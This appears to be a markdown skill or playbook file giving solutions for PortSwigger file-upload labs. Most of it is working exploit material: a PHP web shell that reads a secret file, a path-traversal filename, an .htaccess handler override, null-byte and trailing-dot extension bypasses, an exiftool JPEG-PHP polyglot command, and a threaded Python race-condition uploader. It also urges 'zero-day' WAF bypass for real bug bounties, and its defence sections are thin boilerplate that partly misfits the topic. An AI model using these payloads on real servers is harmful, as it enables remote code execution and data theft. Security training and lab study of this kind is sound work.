---
name: "File Upload Vulnerabilities — Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# File Upload Vulnerabilities — Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: RCE via web shell 🟢 APPRENTICE
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Upload as `shell.php`, access at `/files/avatars/shell.php`.
---

### Lab 2: Content-Type bypass 🟢 APPRENTICE
Change `Content-Type: application/x-php` to `Content-Type: image/jpeg` in upload request.
---

### Lab 3: Path traversal 🟡 PRACTITIONER
```http
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```
Upload to parent directory where PHP execution is enabled.
---

### Lab 4: Extension blacklist bypass 🟡 PRACTITIONER
Try: `.php5`, `.shtml`, `.phtml`, `.phar`. Or upload `.htaccess` first:
```
AddType application/x-httpd-php .l33t
```
Then upload `shell.l33t`.
---

### Lab 5: Obfuscated extension 🟡 PRACTITIONER
`shell.php%00.jpg` (null byte), `shell.php.` (trailing dot), `shell.p." . "hp` (broken validators).
---

### Lab 6: Polyglot web shell 🟡 PRACTITIONER
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" photo.jpg -o polyglot.php
```
Valid JPEG + executable PHP.
---

### Lab 7: Race condition upload 🔴 EXPERT
Upload PHP file → server validates → deletes if invalid. Race: access file BEFORE deletion:
```python
import threading, requests
def upload(): requests.post(URL, files={'avatar': ('shell.php', '<?php echo file_get_contents("/home/carlos/secret"); ?>')})
def read(): r = requests.get(FILE_URL); print(r.text)
for _ in range(100): threading.Thread(target=upload).start(); threading.Thread(target=read).start()
```
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
